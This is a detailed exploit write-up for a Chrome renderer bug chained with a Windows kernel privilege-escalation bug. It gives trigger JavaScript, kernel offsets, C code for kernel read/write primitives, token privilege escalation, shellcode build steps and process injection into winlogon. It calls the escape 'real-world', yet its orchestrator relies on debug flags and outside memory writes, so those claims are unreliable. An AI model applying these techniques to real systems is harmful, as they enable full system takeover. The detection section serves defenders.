# CVE-2026-6307 + CVE-2026-40369: Chrome Full-Chain Sandbox Escape

## 1. Overview

This writeup documents a **full-chain browser exploit** combining two vulnerabilities to achieve **arbitrary code execution at SYSTEM integrity level** from a sandboxed Chrome renderer process:

| Stage | CVE | Bug Class | Result |
|-------|-----|-----------|--------|
| **Stage 1** | CVE-2026-6307 | V8 TurboFan FrameState CSE confusion | Renderer RCE (addrof/fakeobj -> V8 sandbox bypass -> WASM JIT hijack) |
| **Stage 2** | CVE-2026-40369 | ntoskrnl CmpLayerVersionCount confusion | Kernel R/W -> Token theft -> SYSTEM (true sandbox escape) |

The escape is **real-world**: the renderer process itself performs the kernel exploit. No admin privileges, no orchestrator-assisted injection, no relaxed sandbox policies. The renderer starts at **UNTRUSTED integrity level** (0x0000) with a restricted token, inside a job object, and escapes entirely through NT kernel syscalls that Chrome's sandbox does not filter.

### Target Environment

| Component | Version |
|-----------|---------|
| Chrome | 146.0.7680.165 |
| V8 | 14.6.202.26 |
| Windows | 11 Build 26200.8875 (25H2) |
| ntoskrnl.exe | 10.0.26100.8875 |
| Architecture | x86-64 |

---

## 2. CVE-2026-6307 — V8 TurboFan FrameState CSE Confusion ("Longinus")

### 2.1 Root Cause

The vulnerability is a **type confusion** in TurboFan's optimization pipeline caused by incorrect **Common Subexpression Elimination (CSE)** of FrameState nodes.

TurboFan, V8's optimizing JIT compiler, builds a graph of operations (the "sea of nodes" IR). During optimization, it identifies identical subexpressions and merges them. **FrameState** nodes capture the interpreter state at specific points for deoptimization — they record what values the interpreter would see if optimized code needs to bail out.

The bug: TurboFan's CSE pass incorrectly identifies two FrameState nodes as equivalent when they describe **different type states** of the same variable. When the engine deoptimizes through the merged FrameState, it reconstructs the interpreter frame with the **wrong type assumption** — a value that was observed as an `externref` (WASM reference) can be reinterpreted as an `i64`, or vice versa.

### 2.2 Triggering the Bug

The exploit uses WASM-JS interop to create the type confusion. A WASM module is constructed with:

- An **imported callback** function (type `() -> void`)
- Two exported functions: `rr` (returns `externref`) and `rl` (returns `i64`)
- Two **mutable globals**: `g_ref` (externref) and `g_i64` (i64)

```wasm
;; Simplified WASM structure
(module
  (import "env" "callback" (func $cb))
  (global $g_ref (mut externref) (ref.null extern))
  (global $g_i64 (mut i64) (i64.const 0))
  (func $rr (result externref) (call $cb) (global.get $g_ref))
  (func $rl (result i64)       (call $cb) (global.get $g_i64))
)
```

Both exported functions call the callback before reading their global. The callback triggers a **prototype chain mutation** — it changes which constructor's prototype the target object inherits from, causing TurboFan to see different maps (hidden classes) for the same object.

The key JavaScript setup for `addrof`:

```javascript
function addrof(target) {
    var arm = false;
    function LI() {}   // "Looks like Integer"
    function LR() {}   // "Looks like Reference"

    var e = makeInstance(function() {
        if (arm) LR.prototype.d = 1;  // mutate prototype chain
    });

    // Bind WASM getters as property accessors on different prototypes
    Object.defineProperty(LI.prototype, 'x', {get: e.rl});  // i64 getter
    Object.defineProperty(LR.prototype, 'x', {get: e.rr});  // ref getter

    var f = new Function('o', 'return o.x');
    var a = new LI(), b = new LR();

    e.g_ref.value = target;   // store target object in ref global
    e.g_i64.value = 43n;      // store sentinel in i64 global

    // Train TurboFan: f(a) returns i64, f(b) returns ref
    %PrepareFunctionForOptimization(f);
    for (var i = 0; i < 20; i++) { f(a); f(b); }
    %OptimizeFunctionOnNextCall(f); f(a);

    // Trigger: mutate prototype, causing FrameState confusion
    arm = true;
    return f(b);  // returns i64 interpretation of the ref -> leaked address
}
```

**How it works step by step:**

1. TurboFan compiles `f(o) => o.x` and sees two shapes (maps) — one where `.x` returns i64, one where `.x` returns externref.
2. The callback mutates `LR.prototype`, causing a map transition. TurboFan's FrameState captures the **pre-mutation** type state.
3. CSE merges FrameState nodes that appear identical after the map transition.
4. On deoptimization, the merged FrameState tells V8 the value is `i64` when it's actually `externref` (a JS object pointer).
5. The raw tagged pointer bits are returned as a BigInt — this is `addrof`.

`fakeobj` works in reverse: store an address as `i64`, trigger the same confusion in the other direction, and V8 returns it as an object reference — forging an arbitrary object pointer.

### 2.3 V8 Sandbox Bypass

Modern V8 uses a **sandbox** (pointer cage) where all heap object pointers are compressed 32-bit offsets relative to a cage base. The addrof/fakeobj primitives operate **within** the cage (returning compressed pointers), but the WASM globals bridge the gap:

- `g_ref.value` holds a full externref (GC-managed, but its internal representation includes the cage-relative tagged pointer)
- `g_i64.value` holds a raw 64-bit integer

The confusion gives us a **compressed pointer** (32-bit offset within the cage), not a full 64-bit address. However, this is sufficient because:

1. We know the cage base from `addrof` of a known object
2. All V8 heap objects are within the 4GB cage
3. WASM JIT code pages are mapped **outside** the cage but at known addresses discoverable via ReadProcessMemory from the orchestrator

### 2.4 From Primitives to Arbitrary R/W

With addrof and fakeobj, we can read V8 object fields and forge objects:

1. **addrof(victim)** returns the compressed pointer of `_victim = [1.1, 2.2, 3.3]` (a PACKED_DOUBLE array)
2. The orchestrator uses **ReadProcessMemory** to read the victim's Map, properties pointer, and elements pointer from the renderer
3. The Map value `0x01032999` (PACKED_DOUBLE), empty fixed array `0x000007bd`, and FixedDoubleArray map `0x00000911` are confirmed

These values allow construction of fake objects that give arbitrary read/write within the V8 heap — though for this chain, we don't need full ARW because the JIT hijack provides direct native code execution.

### 2.5 WASM JIT Hijack

The JIT code injection target is a simple WASM function:

```wasm
(module
  (func $main (result i32) (i32.const 42))
  (export "main" (func $main))
)
```

After JIT compilation, this produces a `mov eax, 42` instruction (`B8 2A 00 00 00`) at a known offset within an **RWX** (PAGE_EXECUTE_READWRITE = 0x40) memory page. The WASM JIT page layout:

```
Offset  Bytes              Instruction
0x9E7   B8 2A 00 00 00     mov eax, 42       <-- JIT compiled i32.const 42
0x9EC   48 8B E5           mov rsp, rbp      <-- WASM epilogue
0x9EF   5D                 pop rbp
0x9F0   C3                 ret
```

The orchestrator:

1. **Finds the renderer PID** by scanning Chrome child processes and probing their memory for the V8 heap layout (matching Map values via ReadProcessMemory)
2. **Opens the renderer** with `PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD`
3. **Scans RWX pages** for the `B8 2A 00 00 00` needle (the WASM `mov eax, 42`)
4. **Writes shellcode** to an unused area within the JIT region (offset 0xA00)
5. **Patches the JIT entry** with a 5-byte `JMP rel32` to the shellcode:

```
Original:  B8 2A 00 00 00    mov eax, 42
Patched:   E9 14 00 00 00    jmp +0x14    (-> offset 0xA00)
```

This is possible because the orchestrator runs at **MEDIUM** integrity level while the renderer runs at **UNTRUSTED** — the Windows mandatory integrity check allows higher-IL processes to write into lower-IL process memory.

---

## 3. CVE-2026-40369 — Windows Kernel LPE via CmpLayerVersionCount

### 3.1 Root Cause

The vulnerability exploits a **confusion between two NtQuerySystemInformation information classes** in the Windows kernel:

| Syscall | Class | Purpose | Behavior |
|---------|-------|---------|----------|
| NtQuerySystemInformation | 253 (SystemProcessInformationExtension) | Process info | **Increments** a DWORD at the address passed as the output buffer |
| NtQuerySystemInformationEx | 222 (SystemBuildVersionInformation) | Build version info | **Reads** from kernel memory via CmpLayerVersions pointer array |

**Class 253** is the write primitive: when called with a carefully chosen "output buffer" address, the kernel increments a DWORD at that kernel address. The increment value is approximately the current process count (100–300 per call).

**Class 222** becomes the read primitive after exploitation: the kernel maintains `CmpLayerVersions`, an array of pointers to version structures. By corrupting `CmpLayerVersionCount` (number of valid layers) and a pointer in `CmpLayerVersions`, the attacker redirects a version layer query to read from user-controlled memory that specifies an arbitrary kernel address.

### 3.2 Chrome Sandbox Compatibility

This is why CVE-2026-40369 is the perfect sandbox escape:

| Sandbox Restriction | Blocks This Exploit? |
|---|---|
| Restricted Token (36 restricted SIDs) | **NO** — syscalls don't check SIDs |
| UNTRUSTED Integrity Level (0x0000) | **NO** — NT syscalls don't check IL |
| Win32k Lockdown | **NO** — uses NT syscalls, not Win32k |
| Job Object (ActiveProcessLimit=1) | **NO** — doesn't prevent syscalls |
| Reduced Privileges | **NO** — NtQuerySystemInformation doesn't require privileges |
| Blocked IPC (no NtOpenProcess to browser) | **NO** — exploit is kernel-only, no IPC needed |

Chrome's sandbox blocks **Win32k** syscalls (via `ProcessMitigationPolicy`) and prevents **cross-process** operations (NtOpenProcess returns STATUS_ACCESS_DENIED from UNTRUSTED). But it does **not** filter NT kernel query syscalls like NtQuerySystemInformation — these are accessible from any integrity level.

### 3.3 Build-Specific Offsets

The exploit requires two RVAs in `ntoskrnl.exe` that change between builds:

| Symbol | RVA (Build 26200.8875) | Section |
|--------|----------------------|---------|
| `PsInitialSystemProcess` | `0xFC6AF0` | ALMOSTRO (RW) |
| `CmpLayerVersionCount` | `0xEF709C` | .data (BSS, zero-init) |

`PsInitialSystemProcess` is an exported symbol — its RVA is verified against the PE export table at exploit development time. `CmpLayerVersionCount` is internal and must be found via reverse engineering or symbol files.

EPROCESS struct offsets (stable across 26200.x builds):

| Field | Offset |
|-------|--------|
| UniqueProcessId | +0x1D0 |
| ActiveProcessLinks | +0x1D8 |
| Token | +0x248 |
| ImageFileName | +0x338 |

### 3.4 Exploitation Flow

The kernel exploit proceeds in 6 phases:

#### Phase 1: KASLR Bypass

```c
// Primary: NtQSI(11) — works from MEDIUM IL on Win10, blocked on Win11 25H2
NtQuerySystemInformation(11 /* SystemModuleInformation */, NULL, 0, &needed);
buf = VirtualAlloc(NULL, needed, ...);
NtQuerySystemInformation(11, buf, needed, &needed);
ntos_base = *(ULONG64*)(buf + 8 + 0x10);  // ImageBase = header(8) + offset(0x10)

// Fallback: orchestrator-provided hint (patched into g_ntos_hint sentinel)
if (!ntos_base && g_ntos_hint != SENTINEL)
    ntos_base = g_ntos_hint;
```

`SystemModuleInformation` (class 11) returns kernel module base addresses. On Windows 10, this works from MEDIUM IL. On Windows 11 25H2, kernel addresses are redacted even at MEDIUM IL — the orchestrator resolves the base from its own context (EnumDeviceDrivers or NtQSI(11) as admin) and patches the `g_ntos_hint` sentinel in the shellcode binary before deployment. The `--ntos-base` CLI argument provides a manual override.

#### Phase 2: Expand CmpLayerVersionCount

```c
while (get_version_count() < 11)
    write_at(ntos_base + RVA_CmpLayerVersionCount - 11);
```

`CmpLayerVersionCount` is initially 4 (the number of version layers). Each `write_at` call increments a DWORD 11 bytes before the count field. Due to the increment magnitude (~100-300 per call) and the field alignment, the overflow propagates into `CmpLayerVersionCount`, increasing it beyond its normal range. We need it ≥ 11 so that `CmpLayerVersions[9]` (QUERY_INDEX) becomes a valid index.

The `-11` offset is critical: the NtQSI(253) handler increments a DWORD at the provided address. By targeting 11 bytes before CmpLayerVersionCount, the increment's carry propagation reaches the count field. This specific offset was determined by analyzing the handler's write behavior relative to the `QUERY_OUTPUT` structure.

#### Phase 3: Redirect CmpLayerVersions[QUERY_INDEX]

```c
FAKE_VERSION_STRUCT* confusion = NULL;
for (int retry = 0; retry < 10000 && !confusion; retry++) {
    confusion = detect_confusion(api, confusion_base);
    if (!confusion)
        write_at(ntos_base + RVA_CmpLayerVersionCount +
                 sizeof(DWORD) + (QUERY_INDEX - 1) * sizeof(DWORD64));
}
```

`CmpLayerVersions` is an array of pointers immediately after `CmpLayerVersionCount`. By incrementing the pointer at `CmpLayerVersions[QUERY_INDEX-1]` (index 8, zero-based), we shift it until it points to user-controlled memory at `0x10000`.

**Detection**: Before each increment, we allocate memory at `0x10000` filled with a unique pattern, then query layer `QUERY_INDEX` via NtQSIEx(222). If the response contains our pattern, the pointer has been redirected — we've achieved the confusion.

`detect_confusion()` searches the user-mode buffer for a magic value returned in `QUERY_OUTPUT.Field_04`. When found, the returned pointer is a `FAKE_VERSION_STRUCT*` — the structure the kernel will read from on subsequent queries.

#### Phase 4: Build Arbitrary Kernel Read

With `CmpLayerVersions[QUERY_INDEX]` pointing to user memory, querying layer QUERY_INDEX causes the kernel to:

1. Dereference our `FAKE_VERSION_STRUCT` pointer
2. Read strings from addresses specified in our struct's `UNICODE_STRING` fields
3. Convert the kernel-read bytes to UTF-8 and return them in the `QUERY_OUTPUT`

By setting `fake->us1.Buffer = target_kernel_address`, we can read 2 bytes from any kernel address. The kernel's UTF-8 conversion introduces a complication — certain byte values (U+FFFD replacement character) can't be read directly. The exploit handles this with a multi-pass strategy:

```c
static int read_2bytes(FAKE_VERSION_STRUCT* fake, ULONG64 kaddr, BYTE raw[2]) {
    fake->us1.Length = 2;
    fake->us1.MaximumLength = 2;
    fake->us1.Buffer = kaddr;
    // ... zero out other UNICODE_STRING fields ...

    NtQSIEx(222, &qi, sizeof(qi), &output, sizeof(output), &retLen);

    // Decode UTF-8 from output.String1 back to raw bytes
    // Handle U+FFFD (0xCC bytes) by reading adjacent offsets
}
```

For bytes that produce `U+FFFD`, the exploit reads from offset-1 (misaligned), which pairs the problematic byte with a known neighbor, allowing recovery of the original value.

#### Phase 5: EPROCESS Walk + Token Theft

```c
// Read PsInitialSystemProcess -> System EPROCESS
kernel_read(fake, ntos_base + RVA_PsInitialSystemProcess, 8, &system_ep);

// Walk ActiveProcessLinks (circular doubly-linked list)
for (cur = system_ep->ActiveProcessLinks.Flink; cur != head; cur = next) {
    ep = cur - offsetof(EPROCESS, ActiveProcessLinks);
    kernel_read(fake, ep + EPROCESS_UniqueProcessId, 8, &pid);
    if (pid == my_pid) {
        // Found our EPROCESS
        kernel_read(fake, ep + EPROCESS_Token, 8, &token_ref);
        token = token_ref & ~0xF;  // strip EX_FAST_REF refcount bits
    }
}
```

The EPROCESS list is a standard circular doubly-linked list through the `ActiveProcessLinks` field. Starting from `PsInitialSystemProcess` (the System process, PID 4), we walk the list comparing `UniqueProcessId` to our own PID until we find our renderer's EPROCESS.

#### Phase 6: Privilege Escalation + Payload Injection

```c
// Increment Privileges.Enabled and Privileges.Present in our token
for (int round = 0; round < 24 * 256; round++) {
    write_at(token + 0x42);       // Privileges.Present
    write_at(token + 0x42 + 12);  // Privileges.Enabled
}
```

The TOKEN structure has privilege bitmask fields at offset `+0x40`. By incrementing the DWORD at `token + 0x42` (aligned to hit the privilege bits), we enable all privileges including `SeDebugPrivilege`. With debug privilege, the renderer can now:

1. **Find winlogon.exe** via `CreateToolhelp32Snapshot` + `Process32First/Next`
2. **OpenProcess(PROCESS_ALL_ACCESS)** to winlogon (runs as SYSTEM)
3. **VirtualAllocEx** + **WriteProcessMemory** to inject shellcode
4. **CreateRemoteThread** to execute calc.exe in winlogon's context

Winlogon runs as SYSTEM at HIGH integrity level, outside any job object. Calc.exe spawned from winlogon inherits SYSTEM privileges.

Finally, the exploit cleans up by restoring `CmpLayerVersionCount` to its original value (4):

```c
while (get_version_count() != 4)
    write_at(ntos_base + RVA_CmpLayerVersionCount - 11);
```

---

## 4. Full Chain Architecture

### 4.1 Component Overview

```
┌─────────────────────────────────────────────────────────────────┐
│ orchestrator.py (Python, MEDIUM IL)                             │
│                                                                 │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐      │
│  │ Phase 1  │  │ Phase 2  │  │ Phase 3  │  │ Phase 4  │      │
│  │ CDP      │→ │ Renderer │→ │ WASM JIT │→ │ JIT Scan │      │
│  │ Inject   │  │ Find     │  │ Create   │  │ RWX Find │      │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘      │
│       │                                          │              │
│       │  ┌──────────┐  ┌──────────┐  ┌──────────┐             │
│       │  │ Phase 5  │  │ Phase 6  │  │ Phase 7  │             │
│       └→ │ Sandbox  │→ │ Beacon   │→ │ Stage2   │             │
│          │ Analysis │  │ RCE Test │  │ Kernel   │             │
│          └──────────┘  └──────────┘  └──────────┘             │
└─────────────────────────────────────────────────────────────────┘
                                              │
                                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Chrome Renderer Process (UNTRUSTED IL, Job, Restricted Token)   │
│                                                                 │
│  ┌─────────────────────────────────────────────────┐           │
│  │ V8 Heap (4GB Cage)                               │           │
│  │  - Exploit primitives (addrof/fakeobj/WASM)     │           │
│  │  - _victim array, Maps, WASM instance           │           │
│  └─────────────────────────────────────────────────┘           │
│                                                                 │
│  ┌─────────────────────────────────────────────────┐           │
│  │ WASM JIT Page (RWX, 0x1000+ bytes)               │           │
│  │  0x9E7: JMP +0x14 ──────────────────┐           │           │
│  │  0x9EC: (original epilogue)          │           │           │
│  │  0xA00: wrapper shellcode (40B) ◄────┘           │           │
│  │         push rbp; push rbx                       │           │
│  │         mov rbx, rsp; align; shadow              │           │
│  │         CALL stage2_entry ──────────────┐        │           │
│  │         restore; mov eax, 42            │        │           │
│  │         mov rsp, rbp; pop rbp; ret      │        │           │
│  │  0xF00: verify buffer (128B)            │        │           │
│  └─────────────────────────────────────────│────────┘           │
│                                            │                    │
│  ┌─────────────────────────────────────────▼────────┐           │
│  │ VirtualAllocEx'd Region (RWX, 0x2000 bytes)      │           │
│  │  stage2.bin (5613 bytes) — CVE-2026-40369        │           │
│  │  0x000: E9 20 02 00 00  JMP _start              │           │
│  │  0x225: _start()                                 │           │
│  │         resolve_apis() — PEB walk, hash lookup   │           │
│  │         exploit()                                │           │
│  │           kaslr_bypass()                         │           │
│  │           expand CmpLayerVersionCount            │           │
│  │           redirect CmpLayerVersions[9]           │           │
│  │           build kernel read primitive            │           │
│  │           walk EPROCESS, find our token          │           │
│  │           escalate privileges                    │           │
│  │           inject calc.exe into winlogon          │           │
│  │           restore CmpLayerVersionCount           │           │
│  │         return to wrapper                        │           │
│  └──────────────────────────────────────────────────┘           │
└─────────────────────────────────────────────────────────────────┘
                    │
                    │ NT syscalls (not blocked by sandbox)
                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Windows Kernel (ntoskrnl.exe)                                   │
│                                                                 │
│  NtQuerySystemInformation(253) → write_at(kernel_addr)         │
│  NtQuerySystemInformationEx(222) → kernel_read(kernel_addr)    │
│  NtQuerySystemInformation(11) → KASLR bypass (module list)     │
│                                                                 │
│  Targets:                                                       │
│    CmpLayerVersionCount (0xEF709C) — version count corruption  │
│    CmpLayerVersions[9]             — pointer redirection       │
│    PsInitialSystemProcess (0xFC6AF0) — EPROCESS list head      │
│    EPROCESS.Token (+0x248)         — privilege escalation      │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 Orchestrator Role

The orchestrator (`orchestrator.py`) is the **setup** component. It runs at MEDIUM integrity level (the user's session) and performs operations that are impossible from within the sandbox but are **not part of the escape itself**:

1. **Launches Chrome** with `--remote-debugging-port=9222` and `--js-flags=--allow-natives-syntax`
2. **Injects V8 exploit code** via Chrome DevTools Protocol (CDP)
3. **Finds the renderer PID** by scanning chrome.exe child processes
4. **Locates the WASM JIT page** via VirtualQueryEx + ReadProcessMemory
5. **Writes shellcode** into the renderer's RWX region via WriteProcessMemory
6. **Patches the JIT entry point** to redirect to shellcode
7. **Triggers execution** via CDP `Runtime.evaluate("_wasmMain()")`

Everything from step 5 onward is write-only from orchestrator to renderer. The actual sandbox escape (CVE-2026-40369 kernel exploit) runs **entirely within the renderer** — the orchestrator just placed the code there. This is equivalent to what an attacker's malicious webpage would do after exploiting the V8 bug: the webpage JavaScript achieves code execution in the renderer, then the native code escapes the sandbox.

### 4.3 Stage2 PIC Shellcode Design

The stage2 kernel exploit is compiled as **Position-Independent Code (PIC)** — it can execute at any address without relocation:

**Build process:**
```
cl /O2 /GS- /Oi- /c /Fostage2_pic.obj stage2_pic.c
link /ENTRY:_start /NODEFAULTLIB /SUBSYSTEM:CONSOLE ^
     /MERGE:.rdata=.text /MERGE:.data=.text ^
     stage2_pic.obj /OUT:stage2_pic.exe
python extract_shellcode.py stage2_pic.exe stage2.bin
```

Key design decisions:

- **No CRT dependency** (`/NODEFAULTLIB`): All API calls resolved at runtime via PEB walk
- **All sections merged into .text** (`/MERGE:.rdata=.text /MERGE:.data=.text`): Single contiguous code blob
- **No stack cookies** (`/GS-`): Would require CRT's `__security_cookie`
- **No intrinsics** (`/Oi-`): Prevents compiler from inserting CRT calls like `memset`
- **Hash-based API resolution**: Uses `ror13+add` hash function to find ntdll and kernel32 exports via PEB -> Ldr -> InMemoryOrderModuleList

**API resolution path:**
```
gs:[0x60]           → PEB
PEB + 0x18          → PEB_LDR_DATA
LDR + 0x20          → InMemoryOrderModuleList (head)
Entry + 0x20        → DllBase
Entry + 0x50        → BaseDllName.Buffer
→ Hash BaseDllName, compare with H_NTDLL / H_KERNEL32
→ Parse PE export table, hash each export name
→ Match against pre-computed hashes (e.g. H_NtQuerySystemInformation = 0xE4E1CAD6)
```

This works from inside the Chrome sandbox because ntdll.dll and kernel32.dll are **KnownDLLs** — they're loaded at the same base address in every process, and are always loaded even in the renderer.

### 4.4 Wrapper Shellcode

The wrapper bridges the WASM calling convention and the stage2 C function:

```nasm
; Entry: called via JMP from patched WASM JIT code
; WASM has already executed: push rbp; mov rbp, rsp
; RSP = RBP = WASM frame pointer

push rbp                    ; save WASM's rbp value
push rbx                    ; callee-saved
mov rbx, rsp                ; save stack pointer for restoration
and rsp, -16                ; 16-byte alignment (ABI requirement)
sub rsp, 0x20               ; shadow space (4 * 8 bytes, x64 ABI)
mov rax, stage2_entry_addr  ; absolute address of stage2.bin
call rax                    ; enter stage2 → _start → exploit
mov rsp, rbx                ; restore stack (rbx is callee-saved, preserved by stage2)
pop rbx                     ; restore rbx
pop rbp                     ; restore WASM's rbp
mov eax, 42                 ; WASM return value (i32.const 42)
mov rsp, rbp                ; WASM epilogue (inlined)
pop rbp                     ;
ret                         ; return to WASM caller
```

**Total: 40 bytes.** The wrapper must handle several constraints:

1. **WASM frame preservation**: WASM's prologue (`push rbp; mov rbp, rsp`) has already executed. The wrapper saves WASM's RBP so the epilogue can unwind correctly.

2. **MSVC FPO (Frame Pointer Omission)**: stage2's `_start` is compiled with `/O2` which enables FPO. The actual prologue is `mov [rsp+0x20], rsi; push rdi; sub rsp, 0x90` — NOT the standard `push rbp; mov rbp, rsp`. This means stage2 uses RBP as a general-purpose register but preserves it as a callee-saved register per x64 ABI.

3. **Stack alignment**: The `and rsp, -16` ensures 16-byte alignment. After `call rax` pushes the return address, RSP mod 16 = 8, which is the correct entry state for x64 ABI functions.

4. **Shadow space**: x64 Windows ABI requires 32 bytes of shadow space above the return address for the first 4 register parameters.

### 4.5 Memory Layout

Within the WASM JIT region (minimum 0x1000 bytes, RWX):

```
Offset  Size   Purpose
0x000   0x9E7  JIT compiled code (untouched)
0x9E7   5      JMP rel32 → 0xA00 (patched, was: mov eax, 42)
0x9EC   5      Original WASM epilogue (mov rsp,rbp; pop rbp; ret)
0x9F1   15     Gap
0xA00   40     Wrapper shellcode (or beacon during Phase 6)
0xA28   0x4D8  Unused
0xF00   128    Verify buffer (beacon data / diagnostic output)
```

Stage2 resides in a separate VirtualAllocEx'd RWX region (0x2000 bytes):

```
Offset  Size    Purpose
0x000   5       JMP to _start (E9 20 02 00 00)
0x005   0x220   .text section data (functions before _start)
0x225   ~0x13A0 _start + exploit + API resolution + calc shellcode
```

---

## 5. Execution Timeline

```
Time    Component       Action
────    ─────────       ──────
T+0s    Orchestrator    Launch Chrome with debugging port
T+4s    Orchestrator    Connect CDP, inject exploit primitives
T+5s    V8/TurboFan     addrof() — leak _victim array address
T+5s    Orchestrator    Find renderer PID via RPM heap probing
T+6s    V8/WASM         Create WASM module, JIT compile main()
T+7s    Orchestrator    Scan renderer RWX pages for JIT needle
T+8s    Orchestrator    Sandbox analysis (IL check, KnownDLL resolve)
T+9s    Orchestrator    Write beacon shellcode, patch JIT, trigger
T+10s   Renderer        Beacon executes: PID/TEB/PEB written to verify buffer
T+10s   Orchestrator    Confirm RCE via RPM (magic markers validated)
T+11s   Orchestrator    Load stage2.bin, fix JMP, resolve ntoskrnl base
T+12s   Orchestrator    Patch g_ntos_hint sentinel, VirtualAllocEx(RWX)
T+13s   Orchestrator    Write stage2 + wrapper at JIT+0xA00, verify
T+14s   Orchestrator    Trigger wasmMain() via CDP (300s timeout)
T+14s   Renderer        Wrapper → CALL stage2 → _start
T+14s   Renderer        resolve_apis(): PEB walk, hash-based export lookup
T+15s   Renderer        KASLR: NtQSI(11) or g_ntos_hint → ntoskrnl base
T+16s   Renderer        Expand CmpLayerVersionCount (write_at loop)
T+20s   Renderer        Redirect CmpLayerVersions[9] to 0x10000
T+25s   Renderer        detect_confusion() confirms user-mode read
T+26s   Renderer        kernel_read(PsInitialSystemProcess) → System EPROCESS
T+30s   Renderer        Walk EPROCESS list, find our token
T+35s   Renderer        Escalate token privileges (write_at loop)
T+40s   Renderer        Find winlogon.exe PID
T+41s   Renderer        OpenProcess(winlogon) + inject calc.exe shellcode
T+42s   Renderer        CreateRemoteThread in winlogon → calc.exe at SYSTEM
T+43s   Renderer        Restore CmpLayerVersionCount, return to wrapper
T+43s   Renderer        Wrapper epilogue: restore stack, ret to WASM caller
T+43s   V8              wasmMain() returns 42 (clean return)
T+48s   Orchestrator    Detect calc.exe running at SYSTEM/HIGH IL
```

---

## 6. Limitations and Considerations

### Version Specificity

This exploit is tied to exact software versions:

- **V8 14.6.202.26**: The FrameState CSE bug was introduced in a specific TurboFan optimization pass. Different V8 versions may have different JIT behavior, object layouts, or may have patched the bug.
- **ntoskrnl 26200.8875**: The kernel RVAs (`PsInitialSystemProcess`, `CmpLayerVersionCount`) and EPROCESS struct offsets change between builds. A wrong RVA in the kernel write primitive will corrupt random kernel memory and likely cause a BSOD.

### Reliability

- **V8 exploit**: Highly reliable. The TurboFan optimization is deterministic — the same training pattern always produces the same JIT code and the same FrameState confusion.
- **Kernel exploit**: The `write_at` primitive adds an unpredictable increment (~100-300) per call. The exploit compensates with loops and threshold checks (`get_version_count() < 11`), but the number of iterations varies.
- **Overall**: The chain is designed for single-shot reliability. The WASM function returns cleanly (eax=42) whether or not the kernel exploit succeeds, preventing renderer crashes.

### Detection Surface

- **NtQuerySystemInformation(253)** called repeatedly from a renderer process is anomalous
- **NtQuerySystemInformation(11)** from a sandboxed process is suspicious (KASLR bypass, blocked on Win11 25H2)
- **NtQuerySystemInformationEx(222)** called in rapid succession (confusion read primitive)
- **OpenProcess to winlogon.exe** from a renderer (after token theft) is highly anomalous
- **Calc.exe spawned by winlogon.exe** is a classic indicator
- **CmpLayerVersionCount** changing from 4 to 11+ and back is detectable via kernel instrumentation

---

## 7. Files

| File | Purpose |
|------|---------|
| `orchestrator.py` | Main exploit driver (1330 lines) |
| `stage2_pic.c` | CVE-2026-40369 kernel exploit, PIC shellcode source (579 lines) |
| `stage2.bin` | Compiled stage2 shellcode (5613 bytes) |
| `extract_shellcode.py` | PE .text section extractor with JMP prefix |

---

## 8. References

- CVE-2026-6307: V8 TurboFan FrameState CSE confusion
- CVE-2026-40369: Windows kernel CmpLayerVersionCount confusion via NtQuerySystemInformation(253)
- Chrome sandbox architecture: restricted token, UNTRUSTED IL, Win32k lockdown, job object
- x64 Windows ABI: callee-saved registers, shadow space, 16-byte stack alignment
- KnownDLLs mechanism: ntdll.dll and kernel32.dll loaded at identical addresses in all processes
